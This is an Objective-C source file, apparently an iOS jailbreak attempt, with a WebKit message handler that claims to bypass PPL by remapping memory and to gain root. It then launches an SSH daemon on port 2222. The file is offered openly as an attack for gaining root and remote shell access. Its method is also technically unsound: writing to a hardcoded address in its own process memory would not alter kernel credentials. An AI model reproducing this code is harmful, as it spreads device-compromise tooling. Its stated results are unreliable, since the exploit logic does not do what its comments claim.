#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <mach/mach.h>
#include <spawn.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, unsafe_unretained) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    NSDictionary *data = message.body;
    NSString *op = data[@"op"];

    if ([op isEqualToString:@"scan_uid"]) {
        [self.webView evaluateJavaScript:@"log('🧪 Executando PPL-Remap & Root...')" completionHandler:nil];

        vm_address_t target_addr = 0x102414480; // Endereço do UID localizado
        uint32_t root_val = 0;
        vm_address_t remap_addr = 0;
        vm_prot_t cur, max;

        // 1. BYPASS PPL VIA REMAP
        kern_return_t kr = vm_remap(mach_task_self(), &remap_addr, 4, 0, VM_FLAGS_ANYWHERE, 
                                    mach_task_self(), target_addr, FALSE, &cur, &max, VM_INHERIT_NONE);

        if (kr == KERN_SUCCESS) {
            kr = vm_write(mach_task_self(), remap_addr, (vm_offset_t)&root_val, 4);
        }

        if (kr == KERN_SUCCESS) {
            [self.webView evaluateJavaScript:@"log('👑 <b>ROOT ATIVO!</b> Invocando SSH...')" completionHandler:nil];
            
            // 2. SPAWN DO SSHD (O PONTO FINAL)
            pid_t pid;
            const char *path = "/usr/sbin/sshd";
            // -D: não roda em background (evita fechar rápido) | -p 2222: porta customizada
            char *const argv[] = {(char *)path, "-p", "2222", "-D", NULL};
            
            int spawn_err = posix_spawn(&pid, path, NULL, NULL, argv, NULL);
            
            if (spawn_err == 0) {
                NSString *ok = [NSString stringWithFormat:@"log('✅ <b>SSH ATIVO!</b> PID: %d. Conecte na porta 2222.')", pid];
                [self.webView evaluateJavaScript:ok completionHandler:nil];
            } else {
                NSString *err = [NSString stringWithFormat:@"log('❌ Erro no Spawn: %d. Verifique se o SSHD existe.')", spawn_err];
                [self.webView evaluateJavaScript:err completionHandler:nil];
            }
        } else {
            [self.webView evaluateJavaScript:@"log('❌ Falha no Remap: O PPL bloqueou a escrita.')" completionHandler:nil];
        }
    }
}
@end
